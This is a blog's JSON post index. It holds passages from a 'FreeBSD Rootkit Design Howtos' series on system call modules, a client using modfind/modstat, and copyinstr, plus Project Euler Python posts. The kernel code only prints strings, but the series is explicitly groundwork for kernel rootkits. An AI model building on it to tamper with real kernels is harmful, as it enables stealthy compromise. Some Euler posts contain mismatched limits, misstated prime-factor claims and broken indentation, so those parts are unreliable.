System Call Function   A system call function is a function defined in the system call module, which contains a list of actions to be taken every time it receives a system call.   It’s similar to the module event handler except that we have control over what command to receive and what actions to perform.   The prototype of system call function is defined in sys/sysent.h and is shown below.   FILE:/usr/src/sys/sys/sysent.h  typedef int     sy_call_t(struct thread *, void *);   The struct struct thread * points to the current running thread, which you don’t have to care about it at this stage. The void * points to the structure of system call’s arguments.   Compare to the general KLD module, the system call module can receive multiple arguments instead of limited and pre-defined ones. So it is your responsibility to define the arguments that the system call module needs to deal with.   Since the system call’s arguments are wrapped in a struct, so we can define it like this:   struct sc_example_args {     char *str; };   Having the system call’s arguments struct successfully defined, we can now declare our system call function like this:   static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }   The first line is obvious the declaration of the system call function, note that we can receive all arguments via void *syscall_args inside the function.   Let’s now take a look at what happens inside the function, we firstly initialized (It’s not the precise term, but it helps) a local variable *uap using our defined sc_example_args structure.   And then convert the incoming arguments from *syscall_args to match our standard, the sc_examples_args structure, and let the *uap pointer points to it. The simple version of this, is we receive arguments from *syscall_args and save it in *uap with the sc_example_args format.   Now we can do whatever we want with the arguments received, such as print out the string like this:  printf(\"%s\\n\", uap-&gt;str);   Looks we have successfully declared a system call function, but we actually just made a huge mistake.   What I mean by mistake is that the code can still be compiled and executed, but we did it in a very bad manner. You see that modern operating systems segregate it’s memory areas into user space and kernel space, code running in each section don’t directly access each other’s resources. The way we assign a user space structure pointer to a kernel space local variable (uap = (struct sc_example_args *)syscall_args;) is unsafe and not recommended.   Here’s a quote from Designing BSD Rootkits: An Introduction to Kernel Hacking that explains a little bit about kernel space and user space.      FreeBSD segregates its virtual memory into two parts: user space and kernel space. User space is where all user-mode applications run, while kernel space is where the kernel and kernel extensions (i.e., LKMs) run. Code running in user space cannot access kernel space directly (but code running in kernel space can access user space). To access kernel space from user space, an application issues a system call.    Let’s move on for now and get back to kernel/user space transition in details later.   The sysent Structure   Still remember the general module declaration macro in the previous session? Well the system call modules need to register themselves by calling a macro as well, but we have to define a sysent structure first and then pass it to the declaration macro.   The sysent structure is similar to the moduledata that we’ve discussed in the last session, it contains the basic information about the system call. So that once we register a system call module with sysent structure, the operating system will know where and how to quickly fire it.   The FreeBSD system actually maintains a table of sysent structures of all system call modules that are currently loaded in the running kernel, thus every system call module has to provide its sysent structure during initialization to register itself with the sysent table.   So be sure that you understand how sysent structure differs from sysent table before we take a look at its definition in sys/sysent.h   FILE:/usr/src/sys/sys/sysent.h  struct sysent {                 /* system call table */         int     sy_narg;        /* number of arguments */         sy_call_t *sy_call;     /* implementing function */         au_event_t sy_auevent;  /* audit event associated with syscall */         systrace_args_func_t sy_systrace_args_func;                                 /* optional argument conversion function. */         u_int32_t sy_entry;     /* DTrace entry ID for systrace. */         u_int32_t sy_return;    /* DTrace return ID for systrace. */         u_int32_t sy_flags;     /* General flags for system calls. */         u_int32_t sy_thrcnt; }; … extern struct sysent sysent[];   I guess the comments in above code explain exactly what you need to know. Note that normally we just need to specify sy_narg and *sy_call for this to work.   Now we can extend our previous example code as following:   struct sc_example_args {     char *str; };  static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }  static struct sysent sc_example_sysent = {     1,              /* number of arguments */     sc_example      /* implementing function */ };   The Offset Value   Same as the system call function and the sysent structure, the offset value is another parameter you need to set and pass to the system call module declaration macro. Basically, the offset value is the system call module’s number, which will be used by the system to refer to its sysent structure in the sysent table.   It should be an unique integer, and should be explicitly declared in a system call’s declaration macro. It is considered as a good practice to not to assign fixed numbers to dynamic system call modules. Instead, we can ask the system to dynamically assign an unused offset number for our system call module by doing this:   static int offset = NO_SYSCALL;   NO_SYSCALL is a constant, meaning the next available slots offset in sysent table.   Just in case if you are interested, the value for NO_SYSCALL is -1 as shown below:   FILE:/usr/src/sys/sys/sysent.h  #define NO_SYSCALL (-1)   Some of the pre-defined system call offsets are listed in the /sys/kern/syscalls.master file, here’s some allocations:                  Offset Range       Comment                       0-150       Reserved/unimplemented system calls. For use in future Berkeley releases.                 151-180       Reserved for vendor-specific system calls                 181-199       Used by/reserved for BSD                 210-219       Reserved for loadable syscalls                 220-249       Were introduced with NetBSD/4.4Lite-2                 250-299       Initially used in OpenBSD                 300-531       Syscall numbers for FreeBSD           The SYSCALL_MODULE Macro   I said at the beginning of this tutorial that we are gonna need to call a macro to declare a system call module, but we needed to know few other things first. We talked about system call function, we talked about sysent structure and we talked about the offset value.   We need these declared first and only then we can call the SYSCALL_MODULE macro. It is defined in sys/sysent.h as following   FILE:/usr/src/sys/sys/sysent.h  #define SYSCALL_MODULE(name, offset, new_sysent, evh, arg)   Different from the DECLARE_MODULE macro which requires four parameters: name, data, sub, and order, the SYSCALL_MODULE requires five parameter to be passed, which are:   name      This specifies the generic module name, which is passed as a character string.    offset      This specifies the system call’s offset value, which is passed as an integer pointer.    new_sysent      This specifies the completed sysent structure, which is passed as a struct sysent pointer.    evh      This specifies the event handler function.    arg      This specifies the arguments to be passed to the event handler function. For our purposes, we’ll always set this parameter to NULL.    Great, we can now further extend our previous example code as following   struct sc_example_args {     char *str; };  static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }  static struct sysent sc_example_sysent = {     1,              /* number of arguments */     sc_example      /* implementing function */ };  static int offset = NO_SYSCALL;  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, evh, NULL);   Don’t worry about the event handler function evh, it will be exactly same as general module’s event handler function. You’ll see that in the complete example soon, for now let’s sum things up first.   Summary           System Call Module is another type of kernel loadable module            It installs itself in the kernel space and perform programmed activities according to signals received from user space            In order to declare a system call module, five parameters are required, name, offset, new_sysent, evh, and arg                       name is the general module name                        offset is the system call module’s offset number                      It determines where to store the system call module’s sysent structure in sysent[] table                                new_sysent is a pointer to the system call module’s sysent structure                                   sysent structure is similar to moduledata                                    It contains basic information about the system call module including                                               Number of arguments it expects                                                And implementing function                                                                The implementation function, also known as the system call function                                    It contains a list of actions to be taken every time it receives a particular signal                                       Example Code   We can now write the our first system call module, take a look at the following code, there are some comments there to help you understand. There is absolutely nothing new except the event handler function, which in fact, isn’t new to us as well.   /*  * FILE: /root/rootkit/2.1/sc_example.c  * Example 2.1  * The First System Call Module  * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;      printf(\"%s\\n\",uap-&gt;str);      return (0); }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,          /* number of arguments */     sc_example  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch(cmd) {     case MOD_LOAD:         uprintf(\"System call loaded at offset %d.\\n\", offset);         break;     case MOD_UNLOAD:         uprintf(\"System call unloaded from offset %d.\\n\", offset);         break;     default:         error = EOPNOTSUPP;         break;     }      return(error); }  /* Declare the System Call Module */ SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   As usual, we need to have a makefile in the same directory as the source code file.   KMOD=   sc_example SRCS=   sc_example.c  .include &lt;bsd.kmod.mk&gt;   Now build your first system call module by using the make command in the same directory.   myBSD# make Warning: Object directory not changed from original /root/rootkit/2.1 @ -&gt; /usr/src/sys machine -&gt; /usr/src/sys/amd64/include x86 -&gt; /usr/src/sys/x86/include cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c sc_example.c ld  -d -warn-common -r -d -o sc_example.ko sc_example.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk sc_example.ko  export_syms | xargs -J% objcopy % sc_example.ko objcopy --strip-debug sc_example.ko  myBSD# ls @       export_syms machine     makefile    sc_example.c    sc_example.ko   sc_example.o    x86   We have successfully compiled our first system call module and we got the *sc_example.ko file!   Loading and Calling   Here’s the final step we need to take to make use of our first system call module, the loading, and the calling. Let’s firstly try to load the module into the running kernel, and then figure out how to issue the system call.   myBSD# kldload ./sc_example.ko System call loaded at offset 210.   Thanks to our event handler, it prints out the system call number which is the offset value of the system call module’s sysent structure in sysent[] table. You’ll soon realize how important it is for us to issue a system call.   Now we have two ways to send command to our system call module, we can either write a user space application, or type a simple command. I will talk about the command first since the user space application will be covered in next session.   myBSD# kldload ./sc_example.ko System call loaded at offset 210. myBSD# perl -e '$str = \"Hello kernel!\\n I am here to dance with you!\";' -e 'syscall(210, $str);' myBSD# dmesg | tail -n 2 Hello kernel!  I am here to dance with you!   Note that we explicitly specified the system call number in that perl command to send our command to our system call module.   That’s all for today, we made an upgraded version of fun kernel printing tookit which can print whatever string you want it to. We’ll talk about how to call a system call module without knowing it’s offset value in the next tutorial. See you there.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-2-system-call-first-kernel-service-module/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 3 - System Call First Kernel Service Application",
        "excerpt":"Welcome back to FreeBSD Kernel Rootkit Design Howtos, we’ll walk through all necessary techniques you need to program your own BSD kernel rookit. Please be sure you’ve read the previous guides before you proceed with this one.   Review   Same as usual, let’s review what we’ve discussed in the last session. Basically a new kind of kernel module was introduced — The system call module, it registers itself as a kernel service and wait for user to call it via system calls.   SYSCALL_MODULE is the registration macro for system call modules to install themselves into the running kernel, and it requires five parameters:           name as a generic name for the system call module            offset value which determines in which location in the sysent[] table to save our system call module’s sysent structure            new_sysent pointer to a sysent_t structure that contains basic info about the system call module such as number of arguments and pointer to it’s implementation function            implementation function defines activities you want your system call module to perform every time when it receives system call       In this session, we’ll make a custom client application that calls our kernel service module directly without knowing the module’s offset value.   The modfind Function   The modfind function is our key to solve the inflexibility issue, it is very useful but a little bit confusing.   As the name implies, the modfind function helps us to find a specific module in a running kernel by giving it the module name. It is sweet ’cause keeping track of module names is much easier than a bunch of module offset values.   Now the confusing part is, opposite to what you may have guessed, the return value of this function is NOT the system call module’s offset value, but it’s id.   Let’s take a look at a sample piece of modfind function code.   #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt;  int modfind(const char *modname);   The modstat Function   As we can only obtain the id of the system call module by calling modfind function, so here’s what really give us answers - the modstat function.   #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt;  int modstat(int modid, struct module_stat *stat);   The int modid is where we should pass the result of modfind function, but we won’t get the offset value from the function’s return value.   Instead, we have to construct a module_stat structure, and the modstat function will save results to it. That is why we are passing a pointer to a module_stat structure as the second parameter.   The module_stat structure is defined in sys/module.h as shown below   FILE: /usr/src/sys/sys/module.h  struct module_stat {         int             version;        /* set to sizeof(struct module_stat) */         char            name[MAXMODNAME];         int             refs;         int             id;         modspecific_t   data; };  typedef union modspecific {         int     intval;         u_int   uintval;         long    longval;         u_long  ulongval; } modspecific_t;   I know this looks messy, but luckily we don’t need to deal with all of them.   The first part of the code is the definition of module_stat structure, and it contains a modspecific_t union which is defined in the second part, our offset value is stored in this union as intval.   Confusing right, you don’t see any variable name here with offset value in it. The good news is, that’s all we have to learn today, we’ll get to the example code after the summary.   Summary   We now know that having a native client to call system call modules is much better than the perl command we used in last session. It is better because,           We don’t have to remember the offset value of the system call module to call it. This is especially useful when we have to maintain multiple system call modules            The offset value of system call module changes every time we reload it. We’ll still have our flexibility since we rely on module name which is not likely to be changed over time       The way how the client works is that we use modfind to find out the id of a given module name, but sadly it’s not the module’s offset value, which we can’t use to issue the system call.   So we have to utilize another function which is modstat that will give us back a modspecific union, in which we can get the real offset value we want from the intval integer.   Here’s a figure to make your life miserable, you can thank me later. : ] Oh god, why I’m so bad at drawing…      Example Code   Now it’s time for us to see some examples. Let’s firstly start with the example from Designing BSD Rootkits: An Introduction to Kernel Hacking with some additional comments to help you understand the code.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //This is the module_stat structure     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sc_example\"), &amp;stat);     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Unlike kernel modules which we need a makefile to automate some extreme nasty stuff, we don’t need one for this simple client side application. We can directly compile the code like this,   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit' myBSD# ls client      client.c   Looks good so far, we’ve got the client executable file. Let’s load the previous sc_example module and try to call it with our client application.   myBSD# kldload ./sc_example.ko System call loaded at offset 210. myBSD# ./client Usage: ./client &lt;string&gt; myBSD# ./client Hey\\ Kernel! Bad system call (core dumped)   We loaded the sc_example module at offset value of 210, we got a nice help message when wrong number of parameter is specified, which is nice, but we end up with a Bad system call error when we give it the right amount of parameters.   This is bad, because we’ve got nearly no clue of what had happened, and what caused it. But just before we panic, let’s calm down and think about this error message which is our only lead to the problem, which says Bad system call.   It is obvious that we were calling a bad kernel module, so bad that our little client crashed. If we called a bad kernel module in our syscall function, then that means the return value of modfind or modstat function is wrong, or maybe both of them are wrong, who knows.   So I did a little bit debugging, and I soon realized that the return value of modfind is -1, which is obviously bad.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application { ...     printf(\"The return value of modfind is: %d\\n\", modfind(\"sc_example\")); ... }   The result says   myBSD# gcc -o client client.c myBSD# ./client The return value of modfind is: -1   Alright, -1, it probably means fail to find this module, or given module was not found. Given that the module name is the only parameter for the modfind function, it is obvious that the module name is wrong.   This is interesting, we all know that the module name is right, so there’s something wrong from the very beginning. The very source of a system call module is of course it’s declaration macro, so let’s look at there and see if we can get any luck.   FILE:/usr/src/sys/sys/sysent.h #define SYSCALL_MODULE(name, offset, new_sysent, evh, arg)      \\ static struct syscall_module_data name##_syscall_mod = {        \\         evh, arg, offset, new_sysent, { 0, NULL, AUE_NULL }     \\ };                                                              \\                                                                 \\ static moduledata_t name##_mod = {                              \\         \"sys/\" #name,                                           \\         syscall_module_handler,                                 \\         &amp;name##_syscall_mod                                     \\ };   Here we go, a module name prefix! That means every kernel module registered with SYSCALL_MODULE will be given a sys/ prefix in front of their names.   Now we know the root of the problem, let’s modify our code and try again.   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //We'll get the module statues and store it here.     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sys/sc_example\"), &amp;stat); //With prefix this time     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Everything is the same except modstat(modfind(\"sys/sc_example\"), &amp;stat);. Now compile and run.   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit' myBSD# ./client Hey\\ Kernel!\\ What\\'s\\ Up\\? myBSD# dmesg | tail -n1 Hey Kernel! What's Up?   Yada! Our little client is doing it’s job and we’ve achieved our objectives by calling a system call module without knowing it’s offset value.   That will be all for today, thank you for reading this tutorial, like it and share it to support my work, and I’ll see you in the next tutorial!  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-3-system-call-first-kernel-service-application/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 4 - Kernel And User Space Transitions",
        "excerpt":"What’s up geeks, it’s good to see you again! This is the 4th tutorial on FreeBSD Kernel Rootkit Design Howtos. Check back everyday for new tutorials and examples.   Review   Well, in the previous session, we discussed about an upgraded version of client application to issue system calls. We used int modfind(const char *modname); to get the id of a kernel module by specifying module name, and then we successfully retrieved the module’s offset value by calling  int modstat(int modid, struct module_stat *stat); function. We learned that the offset value is actually stored as int intval; in typedef union modspecific which is a sub-union of struct module_stat.   I hope you still remember that we created our very first system call module that expects a string argument to be sent from user land application, and it will then print out the string received. You don’t have to recall the whole process since we’ll redo that in this session, what you do need to recall is that we made a mistake.      modern operating systems segregate it’s memory areas into user space and kernel space, code running in each section don’t directly access each other’s resources. The way we assign a user space structure pointer to a kernel space local variable  (uap = (struct sc_example_args *)syscall_args;) is unsafe and not recommended.    Now it’s time to deal with this problem and fix that example code.   Kernel and User Space Transition   Before we start fixing our example code, I’d like to talk a little bit more about kernel space and user space.   We all know that modern operating systems segregate their virtual memory into user space and kernel space, and commonly user-mode applications run in user space, and system kernel runs in kernel space. Now, the question is why, why such separation exists, what is its purpose.   Actually we can consider user space as isolated sand-boxes, it restricts user land applications so that they don’t mess up with each other’s resources, and most importantly, the kernel space.   As we know, the kernel is the core of any operating system that is in charge of hardware resource allocation, scheduling, I/O, process management, and all sorts of low level stuff. We want to maintain stability and security of the system, so we really don’t want poorly-designed user applications crashing the whole system or malicious user application to modify the behavior of the kernel.   Although it it restricted, but it’s possible for user space and kernel space to access each other’s virtual memory since such communications are necessary. We just have to make sure that we do these in a way that the impact on system stability and security are minimal.      User space CANNOT access kernel space, if you have to, issue a system call   Kernel space CAN access user space, because it literally owns everything of the system. However, it is recommended to copy memory area from user space to kernel space before access it, otherwise may result a fatal panic.      Look at the figure above, it simply says that user-mode applications can only access kernel resources via system calls, and the system call module will return a value or perform pre-defined actions. This is much safer than letting user-mode applications to freely modify kernel resources or calling kernel functions, either kernel resource changing or function calling are performed by pre-programmed and well-designed code running in kernel, which are considered safer and stabler.   The figure also says that kernel modules running in kernel space normally copy user space resources back to it’s own virtual memory area first, and then perform pre-defined actions to either return a value to user space or modify the resource content.   Copying user space resources back to kernel space before referring or modifying is safer and recommended because, if we refer to a user space resource directly from kernel space and it’s swapped out or not faulted in yet, we’ll trigger a fatal panic.   Now let’s figure out how to copy resources around virtual memory areas.   The COPY(9)   Open your terminal and run the following command to see the manpage for all copy functions   myBSD# man copy   Copy functions are copy, copyin, copyout, and copyinstr. What they generally do is      The copy functions are designed to copy contiguous data from one address to another. All but copystr() copy data from user-space to kernel-space or vice-versa.    I find these four function names a little bit confusing, so let me put a figure here to help you remember their usages.      The following is a list of all 4 copy functions definition and usage   copyin()   int copyin(const void *uaddr, void *kaddr, size_t len);   It copies len bytes of data from the user-space address uaddr to the kernel-space address kaddr.   copyout()   int copyout(const void *kaddr, void *uaddr, size_t len);   It copies len bytes of data from the kernel-space address kaddr to the user-space address uaddr.   copyinstr()   int copyinstr(const void *uaddr, void *kaddr, size_t len, size_t *done);   It copies a NUL-terminated string, at most len bytes long, from user-space address uaddr to kernel-space address kaddr. The number of bytes actually copied, including the terminating NUL, is returned in *done (if done is non-NULL).   copystr()   int copystr(const void *kfaddr, void *kdaddr, size_t len, size_t *done);   Copies a NUL-terminated string, at most len bytes long, from kernel-space address kaddr to kernel-space address kaddr. The number of bytes actually copied, including the terminating NUL, is returned in *done (if done is non-NULL).   The Copyin Functions   From the perspective of a system call module, we need to copy memory from user space to kernel space at most of the times. So that there are two copy functions we can utilize to achieve this task, copyin() and copyinstr().   It is necessary to talk about the difference between copyin() and copyinstr() before we choose which one to use for our upgraded example system call module.                          copyin()       copyinstr()                       Direction       From user space to kernel space       From user space to kernel space                 Resource Type       Any user space memory address       NUL-terminated string (ends with \\0)                 Copy Length       Exactly len bytes       At most len bytes long                 Extra Argument       NONE       size_t *done stores the number of bytes actually copied, including the terminating NUL                 Return Value       0 = success EFAULT = bad address       0 = success EFAULT = bad address                 Extra Return Value       ENAMETOOLONG = the string is longer than len bytes       ENAMETOOLONG = the string is longer than len bytes           As you can see from the table above, that these two functions perform basically same actions, but fits under different scenarios. As we need to copy a string from user space to kernel space in our example system call module, we are gonna use copyinstr() this time.   Example Code   Finally here comes our example code, just remember to include the two extra lib files.   /* * FILE: /root/rootkit/4.1/safe_sc_example.c * Example 4.1 * User and Kernel Space Transitions * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;      char kernstr[1024+1]; //This is the place holds a copy of the string in kernel space     int err = 0; //Return stat     size_t size = 0; //Size actually copied      err = copyinstr(uap-&gt;str, &amp;kernstr, 1024, &amp;size);     if (err == EFAULT)         return(err);      printf(\"Safer version output: %s\\n\",kernstr);     return (0); }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,  /* number of arguments */     sc_example  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch(cmd) {     case MOD_LOAD:         uprintf(\"System call loaded at offset %d.\\n\", offset);         break;     case MOD_UNLOAD:         uprintf(\"System call unloaded from offset %d.\\n\", offset);         break;     default:         error = EOPNOTSUPP;         break;     }      return(error); }  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   Save the above code as safe_sc_example.c, and the following as makefile in the same directory   KMOD=   safe_sc_example SRCS=   safe_sc_example.c  .include &lt;bsd.kmod.mk&gt;   Now we can build our safer system call example by issuing make command   myBSD# make Warning: Object directory not changed from original /root/rootkit/4.1 @ -&gt; /usr/src/sys machine -&gt; /usr/src/sys/amd64/include x86 -&gt; /usr/src/sys/x86/include cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c safe_sc_example.c ld  -d -warn-common -r -d -o safe_sc_example.ko safe_sc_example.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk safe_sc_example.ko  export_syms | xargs -J% objcopy % safe_sc_example.ko objcopy --strip-debug safe_sc_example.ko   Check if you have successfully built safe_sc_example.ko file, and load it into the running kernel by   myBSD# kldload ./safe_sc_example.ko System call loaded at offset 210.   Great, now you can use the client application we built in the previous session to make the system call. Just in case you feel as lazy as I do, here’s the client application code again,   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //We'll get the module statues and store it here.     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sys/sc_example\"), &amp;stat); //With prefix this time     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Save the source code in client.c and build it by   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit'   Now we can call our safer system call module example by   myBSD# ./client May\\ the\\ source\\ be\\ with\\ you myBSD# dmesg | tail -n 1 Safer version output: May the source be with you   This is great! We fine-tuned our system call module with the powerful copy functions, this should be enough for now. User and Kernel space transition is a very big topic, it involves many kernel design aspects and concepts, I cannot cover all of them in this short tutorial, but I’ll sure get back to this once we need to.   Hope you enjoy this tutorial, leave a comment below to let me know your suggestions, and May the source be with you!  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-4-kernel-and-user-space-transitions/",
        "teaser":null},{
        "title": "Multiples of 3 And 5",
        "excerpt":"So I was extremly bored, to a degree that I started reading new threads on Hacker News and accidentally saw a guy Failed, Failed, and Finally Succeeded at Learning How to Code, the Project Euler he mentioned saved my day.   Interesting stuff, there are like 400-something computational problems on that site, which according to that guy      Has trained tens of thousands of new programmers.    I started right away to the first problem, suppose to be a pretty easy one.      If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6, and 9. The sum of these multiples is 23. Find the sum of all the multiples of 3 or 5 below 10000.    Turns out it is indeed easy. A loop to find all multiples of 3 or 5 that are below 10000, and add them together, woala!   [$] &lt;git:(master?)&gt; python2 Python 2.7.3 (default, Dec 22 2012, 21:14:12) [GCC 4.7.2] on linux2 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. &gt;&gt;&gt; print \"The answer is: \" + str(sum([x for x in range(1000) if x % 3 == 0 or x % 5 == 0])) The answer is: 233168 &gt;&gt;&gt;   Say x is the multiple of either 3 or 5, at least 1 of the remainder of x % 3 or x % 5 should be 0. Then all we have to do is to find x in the range of 1 to 1000, put them in a list and sum these numbers.   Here’s an elaborated way to do this   result = 0 for x in range(1, 1000):     if x % 3 == 0 or x % 5 == 0:         result += x print result   That’s all for problem 1, easy, but fun. Hopefully I’ll keep getting bored and go through all questions from Project Euler.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/multiples-of-3-and-5/",
        "teaser":null},{
        "title": "Even Fibonacci Numbers",
        "excerpt":"   Each new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be: 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, … By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms.    Alright, jump right into the second question from Project Euler. This one shouldn’t be hard too, just find even numbers in Fibonacci sequence whose values are less than 4e6, then sum to get the answer.   It doesn’t really matter if I generate the Fibnacci sequence beforehand or pick only the even ones and add them on the fly, there’ll only be 34 numbers in the list anyways.   Thanks to Python Docs for the Fibonacci sequence generation code, I got this with a little bit modification.   def genFib(x): result = [] a, b = 0, 1 while a &lt; x:     result.append(a)     a, b = b, a+b return result   And then I can do this   print \"The answer is: \" + str(sum([x for x in genFib(4e6) if x % 2 == 0]))   Or this   result = 0 a, b = 0, 1 while a &lt; 4e6: a, b = b, a+b     if a % 2:         continue     result += a print \"The answer is: \" + str(result)   Anyway, the answer is 4613732.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/even-fibonacci-numbers/",
        "teaser":null},{
        "title": "Largest Prime Factor",
        "excerpt":"   Third question from Project Euler, finding the largest factor of a prime number.    Great, I’ve actually been researching in prime numebrs recently. Got this crazy idea, or a hypotheses few monthes ago, but never had the time to prove it. I spent days trying to figure out better way to generate prime numbers, since my crazy theory involves large primes, I mean, really large ones… Anyway, turns out it’s indeed just a crazy thought, not even worth mentioning.   Get back to the topic. Problem 3 asks to find the lagest prime factors of the number 600851475143. Not a large number to be frank. So I’ll stick simplest factorization algorithm for this particular question.   I guess I’ll write a review on more complex factorization algorithms, those that are used to factor large prime numbers in number theory and cryptograhy. Will get back and put the link here if I ever decide to write it.   def prime_factorization(n):     factors = []     x = 2     while x &lt;= n:         if n % x == 0:             n /= x             factors.append(x)         else:             x += 1     return factors   This is like a brute-force algorithm, put x in the factors list if n is divisible by x, then divide n by x before next iteration. If n cannot be divided by x, then increase the value of x by 1.   Then I can just do this to get the result   print \"The answer is: \" + str(max(prime_factorization(600851475143)))   And the answer is 6857.   Few things to keep in mind           Except for prime numbers, all whole numbers can be broken down into prime factors            There’s no need to check whether x is a prime number, it is guaranteed to be prime       To explain this, take a look at the example below.   